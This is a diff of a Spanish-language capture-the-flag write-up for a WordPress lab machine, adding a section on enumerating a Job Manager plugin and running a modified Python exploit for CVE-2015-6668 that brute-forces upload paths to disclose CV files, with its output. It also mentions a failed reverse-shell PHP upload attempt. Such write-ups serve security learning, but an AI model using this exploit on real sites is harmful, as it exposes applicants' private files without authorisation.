@@ -113,11 +113,75 @@ Me llama la atención el plugin job manager, se usa en la siguiente parte de la 
 
 <img src="http://drive.google.com/uc?export=view&id=133ZhxD1VizC2bkHGch9DumQ6sSCH9rTa">
 
-Mirando la página me llama la atención un apartado llamado **Jobs Listing**, una vez entramos dentro vemos que tiene un formulario que nos permite enviar un CV y en la parte inferior no deja subir un fichero, probñe a subir un php malicioso para hacer una reverse shell pero no funcionó, por lo que decidí subir un currículum de prueba que si aceptó, esto servirá para listar contenido mas adelante.
+Mirando la página me llama la atención un apartado llamado **Jobs Listing**, una vez entramos dentro vemos que tiene un formulario que nos permite enviar un CV y en la parte inferior no deja subir un fichero, probñe a subir un php malicioso para hacer una reverse shell pero no funcionó, por lo que decidí subir un currículum de prueba que si aceptó, esto servirá para listar contenido más adelante.
 
 <img src="http://drive.google.com/uc?export=view&id=1PYwJMaungE3VY1L9Cui26JI35ABzW6KQ">
 
 <img src="http://drive.google.com/uc?export=view&id=17Qw4U5AxeepD6FiZ8hbwIS5C7HVTYjZ0">
+
+Ahora es momento de fijarse en la url, esto nos servirá para más adelante. 
+```
+http://10.10.10.10/index.php/jobs/apply/8/
+```
+Como podemos ver tenemos un "8",si añadimos otros número llegamos al 13, en el que nos aparece lo siguiente... 
+
+<img src="http://drive.google.com/uc?export=view&id=1671D-_HkugOzKyVtsM7kL-c7BsfFORbq">
+
+Nos pone **HackerAccessGranted** en el título, lo que parece ser que nos ha abierto el acceso a algo oculto solo para las manos más experimentadas. 
+
+Vamos a comenzar con lo divertido... buscando una vulnerabilidad para este plugin, me topé con un bypass, en enlace estaba caído por lo que entré en archive.org y mire un snapshot antiguo para poder verlo, os dejo el enlace para que se pueda usar 
+
+https://web.archive.org/web/20160805151229/http://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin
+
+Una vez hemos entendido como funciona el script en python, que en resumidas cuentas lo que hace es iterar por fechas que le indiquemnos diferentes directorios en los que creemos que está un archivo con un nombre que conocemos y nos deja visualizarlo. 
+
+```python
+import requests
+
+print ("""  
+CVE-2015-6668  
+Title: CV filename disclosure on Job-Manager WP Plugin  
+Author: Evangelos Mourikis  
+Blog: https://vagmour.eu  
+Plugin URL: http://www.wp-jobmanager.com  
+Versions: <=0.7.25  
+""" )
+website = input('Enter a vulnerable website: ')  
+filename = input('Enter a file name: ')
+
+filename2 = filename.replace(" ", "-")
+
+for year in range(2017,2022):  
+    for i in range(1,13):
+        for extension in {'doc','pdf','docx','png','jpg','jpeg','gif'}:
+            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
+            req = requests.get(URL)
+            if req.status_code==200:
+                print ("[+] URL of CV found! " + URL)
+```
+
+El script he tenido que modificarlo para que no de errores, cambiando el formato de los prints, los años por lo que queremos filtrar y los tipos de formato que estamos buscando. 
+
+Una vez lo arrancamos nos pide la url de la web vulnerable y el nombre del archivo, en este caso nosotros vamos a usar de nombre el anteriormente nombrado **HackerAccessGranted**
+```
+CVE-2015-6668  
+Title: CV filename disclosure on Job-Manager WP Plugin  
+Author: Evangelos Mourikis  
+Blog: https://vagmour.eu  
+Plugin URL: http://www.wp-jobmanager.com  
+Versions: <=0.7.25  
+
+Enter a vulnerable website: http://10.10.10.10
+Enter a file name: HackerAccessGranted
+[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+```
+Y como vemos nos muestra un resultado!! 
+```
+http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+```
+Si entramos vemos la siguiente imagen. 
+
+<img src="http://drive.google.com/uc?export=view&id=1ikqnYD8Q3wbAcOAib1RvcfOTNuB66AjH">
 
 
 ## Escalada de privilegios 
